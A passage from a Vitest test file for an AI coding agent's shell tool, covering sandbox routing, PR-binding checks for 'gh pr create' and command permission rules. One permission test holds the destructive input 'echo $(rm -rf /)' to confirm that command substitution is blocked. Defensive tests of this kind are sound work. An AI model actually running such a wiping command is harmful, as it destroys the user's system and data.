/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import { shellResultText } from '../utils/shell-result.js';
import type { AnsiOutput } from '../utils/terminalSerializer.js';
import {
  vi,
  describe,
  it,
  expect,
  beforeAll,
  afterAll,
  beforeEach,
  afterEach,
  onTestFinished,
  type Mock,
} from 'vitest';

const mockShellExecutionService = vi.hoisted(() => vi.fn());
const mockExecuteSandbox = vi.hoisted(() => vi.fn());
vi.mock('../sandbox/execute-sandbox.js', () => ({
  executeSandbox: mockExecuteSandbox,
}));
vi.mock('../sandbox/runtime-shell-policy.js', () => ({
  assertShellSandboxCwd: vi.fn(),
}));
const mockExecFile = vi.hoisted(() => vi.fn());
const mockDebugLogger = vi.hoisted(() => ({
  debug: vi.fn(),
  warn: vi.fn(),
}));
vi.mock('node:child_process', async (importOriginal) => ({
  // Only execFile is stubbed: the attribution helpers consume it for their
  // post-commit git probes. execFileSync, spawn, exec, ... stay original.
  ...(await importOriginal<typeof import('node:child_process')>()),
  execFile: (...args: unknown[]) => mockExecFile(...args),
}));
vi.mock('../services/shellExecutionService.js', () => ({
  ShellExecutionService: { execute: mockShellExecutionService },
  isSignalTermination: (signal: number | NodeJS.Signals | null) =>
    signal !== null && signal !== 0,
  getShellAbortReasonKind: (reason: unknown) =>
    typeof reason === 'object' &&
    reason !== null &&
    'kind' in reason &&
    reason.kind === 'background'
      ? 'background'
      : 'cancel',
}));
vi.mock('../utils/debugLogger.js', () => ({
  createDebugLogger: vi.fn(() => mockDebugLogger),
}));
vi.mock('fs');
vi.mock('os');
vi.mock('crypto');
vi.mock('../services/session-pr-service.js', async (importOriginal) => ({
  ...(await importOriginal<
    typeof import('../services/session-pr-service.js')
  >()),
  upsertSessionPrs: vi.fn(),
}));
vi.mock('../utils/github-prs.js', async (importOriginal) => ({
  ...(await importOriginal<typeof import('../utils/github-prs.js')>()),
  fetchAttributionRepoKeys: vi.fn(),
  fetchCurrentBranchName: vi.fn(),
  fetchCurrentBranchPullRequest: vi.fn(),
}));

import { isCommandAllowed, stripShellWrapper } from '../utils/shell-utils.js';
import { SshExecutionEnvironment } from '../services/ssh-execution-environment.js';
import {
  ShellTool,
  type ShellToolInvocation,
  type ShellToolParams,
} from './shell.js';
import { detectBlockedSleepPattern } from './shell.js';
import { upsertSessionPrs } from '../services/session-pr-service.js';
import {
  fetchAttributionRepoKeys,
  fetchCurrentBranchName,
  fetchCurrentBranchPullRequest,
} from '../utils/github-prs.js';
import { ApprovalMode, type Config } from '../config/config.js';
import {
  ToolConfirmationOutcome,
  type ToolInvocation,
  type ToolResult,
} from './tools.js';
import {
  type ShellExecutionResult,
  type ShellOutputEvent,
  type ShellRawCaptureSink,
} from '../services/shellExecutionService.js';
import * as fs from 'node:fs';
import { mkdtemp, rm } from 'node:fs/promises';
import * as os from 'node:os';
import * as crypto from 'node:crypto';
import path from 'node:path';
import * as workspaceContextUtils from '../utils/workspaceContext.js';
import { ToolErrorType } from './tool-error.js';
import { runWithToolCallSource } from '../code-mode/tool-call-runtime.js';
import { OUTPUT_UPDATE_INTERVAL_MS, parseNumstat } from './shell.js';
import { createMockWorkspaceContext } from '../test-utils/mockWorkspaceContext.js';
import { assertShellSandboxCwd } from '../sandbox/runtime-shell-policy.js';
import { PermissionManager } from '../permissions/permission-manager.js';
import { CommitAttributionService } from '../services/commitAttribution.js';

interface ShellToolParameterJsonSchema {
  properties: {
    command: { description: string };
    timeout: { type: string; minimum: number; maximum: number };
  };
}

function getCommandParameterDescription(shellTool: ShellTool): string {
  return (shellTool.schema.parametersJsonSchema as ShellToolParameterJsonSchema)
    .properties.command.description;
}

/** The post-promote hooks a foreground run hands to the service. */
type PostPromote = {
  onData?: (event: { type: string; chunk: unknown }) => void;
  onSettle?: (info: {
    exitCode: number | null;
    signal: number | NodeJS.Signals | null;
    error?: Error;
    endTime: number;
  }) => void;
};

/** A one-line, unstyled AnsiOutput frame. */
function ansiChunk(text: string): AnsiOutput {
  const style = { bold: false, italic: false, dim: false, underline: false };
  return [[{ text, ...style, inverse: false, fg: '', bg: '' }]];
}

/** A settled execution result; `rawOutput` mirrors `output` unless overridden. */
function shellResult(
  overrides: Partial<ShellExecutionResult> = {},
): ShellExecutionResult {
  return {
    rawOutput: Buffer.from(overrides.output ?? ''),
    output: '',
    exitCode: 0,
    signal: null,
    error: null,
    aborted: false,
    pid: 12345,
    executionMethod: 'child_process',
    ...overrides,
  };
}

describe('ShellTool', () => {
  let outputDirectory: string;
  let shellTool: ShellTool;
  let mockConfig: Config;
  let mockShellOutputCallback: (event: ShellOutputEvent) => void;
  let resolveExecutionPromise: (result: ShellExecutionResult) => void;
  let mockFileSystemService: {
    readTextFile: ReturnType<typeof vi.fn>;
    writeTextFile: ReturnType<typeof vi.fn>;
  };
  let mockFileHistoryService: {
    trackEdit: ReturnType<typeof vi.fn>;
  };
  let mockFileReadCache: {
    check: ReturnType<typeof vi.fn>;
    recordWrite: ReturnType<typeof vi.fn>;
  };
  /** What `mockConfig.getBackgroundShellRegistry()` returns. */
  let registry: Record<
    'register' | 'get' | 'getAll' | 'cancel' | 'complete' | 'fail',
    Mock
  >;

  /** The entry the run registered with the background registry. */
  const registeredEntry = () => registry.register.mock.calls[0][0];

  /** Builds an invocation; foreground unless `params` says otherwise. */
  const build = (command: string, params: Partial<ShellToolParams> = {}) =>
    shellTool.build({ command, is_background: false, ...params });

  // Executes with a promote-controller callback, as the interactive UI does
  // (a ShellToolInvocation-only execute() param beyond the shared three).
  const executeWithPromote = (
    invocation: ToolInvocation<ShellToolParams, ToolResult>,
  ) => {
    const setPromoteAc = vi.fn();
    const promise = (invocation as ShellToolInvocation).execute(
      new AbortController().signal,
      undefined,
      {},
      undefined,
      setPromoteAc,
    );
    return { promise, setPromoteAc };
  };

  /** Asserts the spawn call; foreground spawns carry the post-promote options. */
  const expectSpawned = (
    command: unknown,
    { cwd = expect.any(String), background = false } = {},
  ) =>
    expect(mockShellExecutionService).toHaveBeenCalledWith(
      command,
      cwd,
      expect.any(Function),
      expect.any(AbortSignal),
      false,
      expect.objectContaining({}),
      background
        ? { streamStdout: true }
        : expect.objectContaining({ postPromote: expect.any(Object) }),
    );

  /** Asserts none of `mocks` was called. */
  const expectNotCalled = (...mocks: unknown[]) => {
    for (const mock of mocks) expect(mock).not.toHaveBeenCalled();
  };

  /** Asserts `text` contains each of `present` and none of `absent`. */
  const expectText = (
    text: unknown,
    present: string[],
    absent: string[] = [],
  ) => {
    for (const s of present) expect(text).toContain(s);
    for (const s of absent) expect(text).not.toContain(s);
  };

  const setExplicitThreshold = (threshold: number) => {
    (mockConfig.isTruncateToolOutputThresholdExplicit as Mock).mockReturnValue(
      true,
    );
    (mockConfig.getTruncateToolOutputThreshold as Mock).mockReturnValue(
      threshold,
    );
  };

  /** Fakes timers until this test finishes. */
  const fakeTimers = (config?: Parameters<typeof vi.useFakeTimers>[0]) => {
    vi.useFakeTimers(config);
    onTestFinished(() => {
      vi.useRealTimers();
    });
  };

  /** Spies on truncateToolOutput for this test: resolves `result`, or passes content through. */
  const spyTruncation = async (result?: {
    content: string;
    outputFile?: string;
  }) => {
    const truncationModule = await import('./truncation.js');
    const spy = vi.spyOn(truncationModule, 'truncateToolOutput');
    // Restored even when assertions throw, or the spy leaks into later tests.
    onTestFinished(() => {
      spy.mockRestore();
    });
    return result
      ? spy.mockResolvedValue(result)
      : spy.mockImplementation(async (_config, _toolName, content) => ({
          content,
        }));
  };

  /** A minimal AbortSignal stand-in for the stubbed AbortSignal.timeout/any. */
  const fakeSignal = (aborted: boolean, reason?: unknown) =>
    ({
      aborted,
      reason,
      addEventListener: vi.fn(),
      removeEventListener: vi.fn(),
    }) as unknown as AbortSignal;

  /** The combined signal of a foreground run whose timeout fired. */
  const timedOutSignal = () =>
    fakeSignal(true, new DOMException('timed out', 'TimeoutError'));

  // Routes AbortSignal.timeout/any to the given signals until this test ends
  // (even on failure: a patched AbortSignal cascades into unrelated tests).
  const stubAbortSignal = (timeout: unknown, any: unknown = timeout) => {
    const originalAbortSignal = globalThis.AbortSignal;
    vi.stubGlobal('AbortSignal', {
      ...originalAbortSignal,
      timeout: vi.fn().mockReturnValue(timeout),
      any: vi.fn().mockReturnValue(any),
    });
    onTestFinished(() => {
      vi.stubGlobal('AbortSignal', originalAbortSignal);
    });
  };

  beforeAll(async () => {
    const realOs = await vi.importActual<typeof import('node:os')>('node:os');
    outputDirectory = await mkdtemp(
      path.join(realOs.tmpdir(), 'qwen-shell-test-'),
    );
  });

  afterAll(async () => {
    await rm(outputDirectory, { recursive: true, force: true });
  });

  beforeEach(() => {
    vi.clearAllMocks();

    // Default the execFile seam to failure, as real git does against the
    // nonexistent '/test/dir'; attribution-note tests override per subcommand.
    mockExecFile.mockImplementation(
      (
        _file: unknown,
        _args: unknown,
        _options: unknown,
        callback: (error: Error | null, stdout: string, stderr: string) => void,
      ) => {
        queueMicrotask(() =>
          callback(new Error('execFile stubbed: default failure'), '', ''),
        );
        return { on: vi.fn() };
      },
    );

    mockFileSystemService = {
      readTextFile: vi.fn(),
      writeTextFile: vi.fn().mockResolvedValue({}),
    };
    mockFileHistoryService = {
      trackEdit: vi.fn().mockResolvedValue(undefined),
    };
    mockFileReadCache = {
      check: vi.fn().mockReturnValue({
        state: 'fresh',
        entry: {
          lastReadAt: Date.now(),
          lastReadCacheable: true,
        },
      }),
      recordWrite: vi.fn(),
    };
    registry = {
      register: vi.fn(),
      get: vi.fn(),
      getAll: vi.fn().mockReturnValue([]),
      cancel: vi.fn(),
      complete: vi.fn(),
      fail: vi.fn(),
    };

    mockConfig = {
      getCoreTools: vi.fn().mockReturnValue([]),
      getPermissionsAllow: vi.fn().mockReturnValue([]),
      getPermissionsAsk: vi.fn().mockReturnValue([]),
      getPermissionsDeny: vi.fn().mockReturnValue([]),
      getDebugMode: vi.fn().mockReturnValue(false),
      getTargetDir: vi.fn().mockReturnValue('/test/dir'),
      getSessionId: vi.fn().mockReturnValue('test-session'),
      getWorkspaceContext: vi
        .fn()
        .mockReturnValue(createMockWorkspaceContext('/test/dir')),
      storage: {
        getUserSkillsDirs: vi.fn().mockReturnValue(['/test/dir/.qwen/skills']),
        getProjectTempDir: vi.fn().mockReturnValue(outputDirectory),
        getProjectDir: vi.fn().mockReturnValue('/test/proj'),
      },
      getTruncateToolOutputThreshold: vi.fn().mockReturnValue(0),
      getTruncateToolOutputLines: vi.fn().mockReturnValue(0),
      isTruncateToolOutputThresholdExplicit: vi.fn().mockReturnValue(false),
      getPermissionManager: vi.fn().mockReturnValue(undefined),
      getLlmClient: vi.fn(),
      getFileSystemService: vi.fn().mockReturnValue(mockFileSystemService),
      getFileHistoryService: vi.fn().mockReturnValue(mockFileHistoryService),
      getFileReadCache: vi.fn().mockReturnValue(mockFileReadCache),
      getFileReadCacheDisabled: vi.fn().mockReturnValue(false),
      getModel: vi.fn().mockReturnValue('qwen3-coder-plus'),
      isInteractive: vi.fn().mockReturnValue(true),
      getGitCoAuthor: vi.fn().mockReturnValue({
        commit: true,
        pr: true,
        name: 'Qwen-Coder',
        email: 'qwen-coder@alibabacloud.com',
      }),
      setApprovalMode: vi.fn(),
      getShouldUseNodePtyShell: vi.fn().mockReturnValue(false),
      getShellDefaultTimeoutMs: vi.fn().mockReturnValue(undefined),
      getShellHeartbeatIntervalMs: vi.fn().mockReturnValue(undefined),
      getBackgroundShellRegistry: vi.fn().mockReturnValue(registry),
      getSessionService: vi.fn().mockReturnValue({
        getPrSessionPathForArchiveState: vi
          .fn()
          .mockReturnValue('/test/proj/chats/test-session.pr.json'),
        emitSessionPrBound: vi.fn(),
      }),
    } as unknown as Config;

    // executeBackground writes to disk; stub mkdirSync + createWriteStream.
    // writeFileSync is reset because clearAllMocks keeps a test's throwing impl.
    vi.mocked(fs.mkdirSync).mockReturnValue(undefined);
    vi.mocked(fs.writeFileSync).mockReturnValue(undefined);
    vi.mocked(fs.lstatSync).mockReturnValue({
      isSymbolicLink: () => false,
    } as fs.Stats);
    const fileStat = {
      dev: 1,
      ino: 2,
      isDirectory: () => false,
      isFile: () => true,
    };
    vi.mocked(fs.statSync).mockReturnValue(fileStat as fs.Stats);
    vi.mocked(fs.promises.stat).mockResolvedValue({
      ...fileStat,
      mtimeMs: 1,
      size: 4,
    } as fs.Stats);
    vi.mocked(fs.createWriteStream).mockReturnValue({
      write: vi.fn(),
      end: vi.fn(),
      on: vi.fn(),
      // Both settle paths (promote + executeBackground) wait for
      // `once('finish')` before transitioning the registry; fire it at once so
      // tests don't hang. Ordering-sensitive tests install a deferred stream.
      once: vi.fn((event: string, handler: () => void) => {
        if (event === 'finish') handler();
      }),
    } as unknown as fs.WriteStream);

    vi.mocked(os.platform).mockReturnValue('linux');
    vi.mocked(os.tmpdir).mockReturnValue('/tmp');
    (vi.mocked(crypto.randomBytes) as Mock).mockReturnValue(
      Buffer.from('abcdef', 'hex'),
    );

    shellTool = new ShellTool(mockConfig);

    // Capture the output callback to simulate streaming events from the service
    mockShellExecutionService.mockImplementation((_cmd, _cwd, callback) => {
      mockShellOutputCallback = callback;
      return {
        pid: 12345,
        result: new Promise((resolve) => {
          resolveExecutionPromise = resolve;
        }),
      };
    });

    // Ensure attribution singleton is clean between tests
    CommitAttributionService.resetInstance();
  });

  it('exposes the accepted timeout range in its schema', () => {
    const schema = shellTool.schema
      .parametersJsonSchema as ShellToolParameterJsonSchema;

    expect(schema.properties.timeout).toEqual(
      expect.objectContaining({
        type: 'integer',
        minimum: 1,
        maximum: 600000,
      }),
    );
  });

  describe('internal runtime sandbox routing', () => {
    beforeEach(() => {
      mockConfig.getShellExecutionSandbox = vi.fn().mockReturnValue({
        workspace: '/test/dir',
        installation: '/install',
        state: '/state',
        filesystem: 'workspace-write',
        network: 'closed',
      });
      mockExecuteSandbox.mockResolvedValue({
        pid: 12345,
        result: Promise.resolve({
          ...shellResult({ output: 'confined' }),
          sandboxStatus: { state: 'confirmed', exitCode: 0 },
        }),
      });
    });

    it('rejects a directory the sandbox will not admit at build time', () => {
      vi.mocked(assertShellSandboxCwd).mockImplementationOnce(() => {
        throw new Error('outside');
      });
      expect(() => build('ls', { directory: '/elsewhere' })).toThrow(
        "Directory '/elsewhere' must be an existing directory inside the execution sandbox workspace.",
      );
      expect(assertShellSandboxCwd).toHaveBeenCalledWith(
        mockConfig.getShellExecutionSandbox(),
        '/elsewhere',
      );
    });

    it('runs sed through the backend without host preview or write', async () => {
      const invocation = build("sed -i 's/old/new/' file.txt");
      expect(
        (await invocation.getConfirmationDetails(new AbortController().signal))
          .type,
      ).toBe('exec');
      await invocation.execute(new AbortController().signal);
      expect(mockExecuteSandbox).toHaveBeenCalledOnce();
      expect(mockFileSystemService.readTextFile).not.toHaveBeenCalled();
      expect(mockFileSystemService.writeTextFile).not.toHaveBeenCalled();
      expect(mockShellExecutionService).not.toHaveBeenCalled();
    });

    it('keeps Git/PR metadata subprocesses off the host', async () => {
      const gitSpy = vi.spyOn(
        await import('node:child_process'),
        'execFileSync',
      );
      onTestFinished(() => {
        gitSpy.mockRestore();
      });
      const commands = [
        'git commit -m test',
        'gh pr create --title test --body test',
        'gh pr create --title background --body background',
      ];
      for (const [i, command] of commands.entries()) {
        await build(command, { is_background: i === 2 }).execute(
          new AbortController().signal,
        );
      }
      expect(mockExecuteSandbox).toHaveBeenCalledTimes(3);
      commands.forEach((command, i) =>
        expect(mockExecuteSandbox.mock.calls[i][1].args).toEqual([
          '-c',
          command,
        ]),
      );
      expectNotCalled(gitSpy, mockExecFile, fetchCurrentBranchPullRequest);
    });

    it('routes background execution and closes its stream on setup failure', async () => {
      const destroy = vi.fn();
      vi.mocked(fs.createWriteStream).mockReturnValue({
        on: vi.fn(),
        destroy,
      } as unknown as fs.WriteStream);
      mockExecuteSandbox.mockRejectedValueOnce(
        new Error('sandbox setup failed'),
      );
      await expect(
        build('echo test', { is_background: true }).execute(
          new AbortController().signal,
        ),
      ).rejects.toThrow('sandbox setup failed');
      expect(mockExecuteSandbox.mock.calls[0][4]).toBe(false);
      expect(destroy).toHaveBeenCalledOnce();
      expect(fs.rmSync).toHaveBeenCalledWith(
        expect.stringMatching(/\.output$/),
        {
          force: true,
        },
      );
      expectNotCalled(registry.register, mockShellExecutionService);
    });

    it('uses a conservative permission default without host git probes', async () => {
      expect(await build('git status').getDefaultPermission()).toBe('ask');
    });
  });

  describe('gh pr create binding', () => {
    const fetchCurrentBranchPullRequestMock = vi.mocked(
      fetchCurrentBranchPullRequest,
    );
    const fetchCurrentBranchNameMock = vi.mocked(fetchCurrentBranchName);
    const fetchAttributionRepoKeysMock = vi.mocked(fetchAttributionRepoKeys);
    const upsertSessionPrsMock = vi.mocked(upsertSessionPrs);

    beforeEach(() => {
      // Default identity: fixture URLs belong to `o/r`, the session sits on
      // `main`, and every offered candidate lands as a new binding.
      fetchCurrentBranchNameMock.mockResolvedValue('main');
      fetchAttributionRepoKeysMock.mockResolvedValue({
        resolved: 'github.com/o/r',
      });
      upsertSessionPrsMock.mockImplementation(
        async (_filePath, candidates) => ({
          prs: [],
          added: candidates.map((candidate) => candidate.number),
          alreadyBound: [],
          unresolved: [],
        }),
      );
    });

    /** gh's view of the branch's PR `number` in repo o/r. */
    const branchPr = (number: number, state: 'open' | 'merged' = 'open') => ({
      status: 'pr' as const,
      number,
      url: `https://github.com/o/r/pull/${number}`,
      state,
    });

    /** The branch had no PR before the run; gh resolves PR `number` after it. */
    const mockCreatedPr = (
      number: number,
      pr: { url?: string; headRefName?: string } = {},
    ) =>
      fetchCurrentBranchPullRequestMock
        .mockResolvedValueOnce({ status: 'none' })
        .mockResolvedValueOnce({
          ...branchPr(number),
          headRefName: 'main',
          ...pr,
        });

    /** The sidecar record for PR `number` (o/r, open). */
    const prRecord = (number: number) => ({
      number,
      url: `https://github.com/o/r/pull/${number}`,
      state: 'open',
    });

    /** Asserts PR `number` was offered to the active session's sidecar. */
    const expectBound = (number: number) =>
      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
        '/test/proj/chats/test-session.pr.json',
        [expect.objectContaining({ number })],
      );

    const sessionServiceMock = () =>
      mockConfig.getSessionService() as unknown as {
        emitSessionPrBound: Mock;
        getSessionLocation: unknown;
        getPrSessionPathForArchiveState: Mock;
      };

    // Runs `command` in `directory` to `output`/`exitCode` (+ `result`
    // overrides); `promote` gets the exposed promote controller before settle.
    async function runShell(
      command: string,
      output: string,
      exitCode = 0,
      {
        directory = '/test/dir',
        result = {},
        promote,
      }: {
        directory?: string;
        result?: Partial<ShellExecutionResult>;
        promote?: (promoteAc: AbortController) => void;
      } = {},
    ): Promise<ToolResult> {
      const callsBefore = mockShellExecutionService.mock.calls.length;
      const invocation = build(command, { directory });
      const { promise: resultPromise, setPromoteAc } = promote
        ? executeWithPromote(invocation)
        : {
            promise: invocation.execute(new AbortController().signal),
            setPromoteAc: undefined,
          };
      // Wait for THIS invocation's spawn: after an earlier runShell,
      // `.toHaveBeenCalled()` is already true, and resolving the stale resolver
      // would orphan the new one (the pre-spawn snapshot yields before the call).
      await vi.waitFor(() =>
        expect(mockShellExecutionService.mock.calls.length).toBeGreaterThan(
          callsBefore,
        ),
      );
      promote?.(setPromoteAc!.mock.calls[0][0] as AbortController);
      resolveExecutionPromise({
        output,
        exitCode,
        aborted: false,
        ...result,
      } as ShellExecutionResult);
      const toolResult = await resultPromise;
      // The binding hook is fire-and-forget; give its async gh attribution a
      // beat so negative assertions cannot pass merely because the hook has
      // not scheduled yet.
      await new Promise((resolve) => setTimeout(resolve, 20));
      return toolResult;
    }

    const PR_77 = 'https://github.com/o/r/pull/77\n';
    const PR_42 = 'https://github.com/o/r/pull/42\n';
    const CREATE_OR_VIEW =
      'gh pr create --fill || gh pr view --json url --jq .url';

    it('writes the PR sidecar when gh attributes the create to the branch PR', async () => {
      // A real create: pre-run snapshot `none`, gh resolves the new PR after.
      mockCreatedPr(77);
      await runShell(
        'gh pr create --title x --body y',
        'noise\nhttps://github.com/o/r/pull/77\n',
      );

      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
        '/test/proj/chats/test-session.pr.json',
        [{ ...prRecord(77), source: 'create' }],
      );
      // The daemon never sees the child's sidecar write; the catalog
      // notification is what makes the badge appear.
      expect(sessionServiceMock().emitSessionPrBound).toHaveBeenCalledWith(
        'test-session',
        prRecord(77),
      );
    });

    it('binds the PR gh resolved even when a later echo prints another URL', async () => {
      // A supersede/changelog echo printing a second same-repo URL must not
      // steer the binding: gh's own resolution for the branch wins.
      mockCreatedPr(100);
      await runShell(
        'gh pr create --fill',
        'https://github.com/o/r/pull/100\nsuperseded by https://github.com/o/r/pull/42\n',
      );

      expectBound(100);
    });

    it('does not bind when the create fails without a URL', async () => {
      fetchCurrentBranchPullRequestMock.mockResolvedValue({ status: 'none' });
      await runShell('gh pr create --title x', 'error: not logged in', 1);

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind a non-zero exit even when the output carries a URL', async () => {
      // A compound can exit non-zero after another segment printed a PR URL;
      // only a fully successful run may bind.
      fetchCurrentBranchPullRequestMock.mockResolvedValue(branchPr(1234));
      await runShell(
        'gh pr create --fill; cat notes.txt',
        'https://github.com/o/r/pull/1234\n',
        1,
      );

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind a URL that gh did not vouch for', async () => {
      // These shapes pass the execution gate, but gh resolves no PR for the
      // branch: nothing was created, whatever same-repo URL the output has.
      fetchCurrentBranchPullRequestMock.mockResolvedValue({ status: 'none' });
      await runShell(
        'gh pr create --fill; cat notes.txt',
        'create failed\nhttps://github.com/o/r/pull/1234\n',
      );
      await runShell(
        'echo "retry: npm test && gh pr create --fill" && cat pr_url.txt',
        PR_42,
      );
      await runShell(
        'echo https://github.com/o/r/pull/42 # && gh pr create',
        PR_42,
      );

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind when gh resolves a PR whose URL is absent from the output', async () => {
      // `--help` passes the execution gate and gh resolves a new PR after the
      // run, but this run printed no created URL: the output check declines.
      mockCreatedPr(5);
      await runShell('gh pr create --help', 'usage: gh pr create\n');

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('attributes against the execution directory, not the target dir', async () => {
      // `directory` may point at another registered workspace; attributing the
      // target dir instead would bind nothing (or a wrong-repo PR whose URL
      // happens to appear in the output).
      mockCreatedPr(77);
      await runShell('gh pr create --fill', PR_77, 0, {
        directory: '/test/dir/nested',
      });

      expect(fetchCurrentBranchPullRequestMock).toHaveBeenCalledWith(
        '/test/dir/nested',
        undefined,
      );
      expectBound(77);
    });

    it('passes inline gh credentials from the command to the verification legs', async () => {
      // Both gh legs must authenticate as the gated create did, or a create
      // with no ambient gh auth silently misses. The record OVERLAYS
      // process.env (it becomes the child's whole env, so a bare record drops
      // PATH/HOME), and the repo-identity leg needs the token too.
      mockCreatedPr(77);
      await runShell('GH_TOKEN=t0ken gh pr create --fill', PR_77);

      const overlayEnv = { ...process.env, GH_TOKEN: 't0ken' };
      expect(fetchCurrentBranchPullRequestMock).toHaveBeenCalledWith(
        '/test/dir',
        overlayEnv,
      );
      expect(fetchAttributionRepoKeysMock).toHaveBeenCalledWith(
        '/test/dir',
        overlayEnv,
      );
    });

    it('does not bind when gh resolves a merged or closed PR', async () => {
      // The retry shape exits 0 without creating anything and gh resolves the
      // branch's EXISTING merged PR; binding would stamp 'open' over it and
      // move the entry to the tail with a fresh createdAt.
      fetchCurrentBranchPullRequestMock.mockResolvedValue(
        branchPr(42, 'merged'),
      );
      await runShell(CREATE_OR_VIEW, PR_42);

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind an open PR the branch already had before the run', async () => {
      // The matching pre-run snapshot proves nothing was created; stamping the
      // session as creator would falsify the badge's binding-time order, and
      // at the cap the single candidate would evict a genuine binding.
      fetchCurrentBranchPullRequestMock.mockReset();
      fetchCurrentBranchPullRequestMock.mockResolvedValue(branchPr(42));
      await runShell(CREATE_OR_VIEW, PR_42);

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind when the pre-run snapshot errored', async () => {
      // An errored pre-run fetch proves nothing; failing open would bind the
      // existing PR once the post-run fetch recovers. The fallback is not Once:
      // declining skips the second fetch, so a Once would leak into later tests.
      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
        status: 'error',
      });
      fetchCurrentBranchPullRequestMock.mockResolvedValue(branchPr(42));
      await runShell(CREATE_OR_VIEW, PR_42);

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not re-emit when the resolved PR is already bound', async () => {
      // The pre-run snapshot missed the PR (a gh flake), so the resolution
      // reaches persistence; the write reports it alreadyBound, so nothing is
      // re-stamped and no catalog notification fires.
      mockCreatedPr(42);
      upsertSessionPrsMock.mockResolvedValue({
        prs: [],
        added: [],
        alreadyBound: [42],
        unresolved: [],
      });
      await runShell(CREATE_OR_VIEW, PR_42);

      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
        '/test/proj/chats/test-session.pr.json',
        [{ ...prRecord(42), source: 'create' }],
      );
      expect(sessionServiceMock().emitSessionPrBound).not.toHaveBeenCalled();
    });

    it('binds when a promote is refused after the command settled', async () => {
      // The promote abort fires with kind 'background', but the child already
      // completed with exit 0 and full output, so the binding gate still runs.
      mockCreatedPr(77);
      await runShell('gh pr create --fill', PR_77, 0, {
        result: { aborted: true },
        promote: (promoteAc) => promoteAc.abort({ kind: 'background' }),
      });

      expectBound(77);
    });

    it('does not bind when a promote succeeds mid-run (documented scope)', async () => {
      // A promoted create settles through the registry (output streams to a
      // file), so the foreground gate never sees it; out of scope by design
      // (see bindGhPrCreate). Only the pre-run snapshot is consumed.
      fetchCurrentBranchPullRequestMock.mockResolvedValueOnce({
        status: 'none',
      });
      const result = await runShell('gh pr create --fill', PR_77, 0, {
        result: { promoted: true, pid: 99999 },
        promote: () => {},
      });

      expect(result.llmContent).toContain('promoted to background');
      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind an is_background create (documented scope)', async () => {
      // No pre-run snapshot is taken for a background run and its settle never
      // reaches the gate: pinned so changing this limitation is deliberate.
      const result = await build('gh pr create --fill', {
        directory: '/test/dir',
        is_background: true,
      }).execute(new AbortController().signal);
      resolveExecutionPromise({
        output: PR_77,
        exitCode: 0,
        aborted: false,
      } as ShellExecutionResult);
      await new Promise((resolve) => setTimeout(resolve, 20));

      expect(result.llmContent).toContain('bg_');
      expectNotCalled(fetchCurrentBranchPullRequestMock, upsertSessionPrsMock);
    });

    it('does not bind when the command switched branches mid-run', async () => {
      // A compound that checks out another branch resolves that branch's
      // existing PR post-run; its head differs from the pre-run branch.
      mockCreatedPr(9, { headRefName: 'other-branch' });
      await runShell(
        'git checkout other-branch && gh pr create --fill || gh pr view --json url --jq .url',
        'https://github.com/o/r/pull/9\n',
      );

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind when the pre-run branch could not be captured', async () => {
      // Detached HEAD or a git failure leaves the pre-run branch unproven;
      // decline instead of binding whatever the post-run fetch resolves.
      fetchCurrentBranchNameMock.mockResolvedValueOnce(undefined);
      mockCreatedPr(77);
      await runShell('gh pr create --fill', PR_77);

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind a PR outside the pre-run repo identity', async () => {
      // An in-command `git remote set-url origin` / `gh repo set-default`
      // retargets the post-run resolution at another repo whose same-named
      // branch holds an open PR; the pre-run repo keys decline it.
      fetchAttributionRepoKeysMock.mockResolvedValueOnce({
        resolved: 'github.com/o/r',
      });
      mockCreatedPr(5, { url: 'https://github.com/victim/other/pull/5' });
      await runShell(
        CREATE_OR_VIEW,
        'https://github.com/victim/other/pull/5\n',
      );

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('does not bind when the pre-run repo identity could not be resolved', async () => {
      // gh cannot say which repo this checkout attributes to: decline like
      // the errored-snapshot arm instead of binding anywhere.
      fetchAttributionRepoKeysMock.mockResolvedValueOnce({});
      mockCreatedPr(77);
      await runShell('gh pr create --fill', PR_77);

      expect(upsertSessionPrsMock).not.toHaveBeenCalled();
    });

    it('binds a fork-layout create attributed to the parent repo', async () => {
      // From a fork checkout gh resolves PR operations to the PARENT repo, so
      // the fork-parent identity is part of the pre-run set.
      fetchAttributionRepoKeysMock.mockResolvedValueOnce({
        resolved: 'github.com/fork/r',
        parent: 'github.com/o/r',
      });
      mockCreatedPr(77);
      await runShell('gh pr create --fill', PR_77);

      expectBound(77);
    });

    it('writes the binding to the archived sidecar when the session was archived mid-run', async () => {
      // An archive transition during the gh round-trip must not strand the
      // binding on a resurrected active sidecar: the location is re-resolved
      // immediately before the locked mutation.
      mockCreatedPr(77);
      const sessionService = sessionServiceMock();
      sessionService.getSessionLocation = vi.fn().mockResolvedValue('archived');
      sessionService.getPrSessionPathForArchiveState.mockImplementation(
        (_sessionId: string, state: string) =>
          `/test/proj/chats-${state}/test-session.pr.json`,
      );
      await runShell('gh pr create --fill', PR_77);

      expect(upsertSessionPrsMock).toHaveBeenCalledWith(
        '/test/proj/chats-archived/test-session.pr.json',
        [expect.objectContaining({ number: 77 })],
      );
    });
  });

  describe('isCommandAllowed', () => {
    it('should allow a command if no restrictions are provided', async () => {
      (mockConfig.getCoreTools as Mock).mockReturnValue(undefined);
      (mockConfig.getPermissionsDeny as Mock).mockReturnValue(undefined);
      expect((await isCommandAllowed('ls -l', mockConfig)).allowed).toBe(true);
    });

    it('should block a command with command substitution using $()', async () => {
      expect(
        (await isCommandAllowed('echo $(rm -rf /)', mockConfig)).allowed,
      ).toBe(false);
    });
  });

  describe('build', () => {
